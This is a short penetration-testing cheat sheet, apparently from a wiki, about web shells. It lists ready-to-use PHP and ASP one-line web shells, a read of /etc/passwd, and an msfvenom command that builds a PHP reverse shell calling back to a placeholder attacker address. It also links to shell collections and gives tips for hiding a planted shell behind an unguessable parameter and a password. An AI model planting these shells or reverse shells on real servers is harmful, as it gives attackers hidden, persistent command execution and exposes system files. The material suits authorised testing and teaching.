# Web Shells

### PHP web Shells

| **Web Shell**                                                                           | **Description**                       |
| --------------------------------------------------------------------------------------- | ------------------------------------- |
| `<?php file_get_contents('/etc/passwd'); ?>`                                            | Basic PHP File Read                   |
| `<?php system('hostname'); ?>`                                                          | Basic PHP Command Execution           |
| `<?php system($_REQUEST['cmd']); ?>`                                                    | Basic PHP Web Shell                   |
| `<% eval request('cmd') %>`                                                             | Basic ASP Web Shell                   |
| `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php`          | Generate PHP reverse shell            |
| [PHP Web Shell](https://github.com/Arrexel/phpbash)                                     | PHP Web Shell                         |
| [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)                 | PHP Reverse Shell                     |
| [Web/Reverse Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) | List of Web Shells and Reverse Shells |

### JSP Web Shell

{% embed url="https://github.com/SecurityRiskAdvisors/cmd.jsp" %}

### Essential Considerations:

1. Use an MD5 hash for the parameter name on your web shell so it cannot be guessed and hijacked by an adjacent attacker:
   1. <pre><code><strong>&#x3C;?php
      </strong>system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
      ?>
      </code></pre>
2. Use a Password protected web shell in case it is discovered.&#x20;
3. Note where all files have been dropped, and ensure they are cleaned up afterwards.
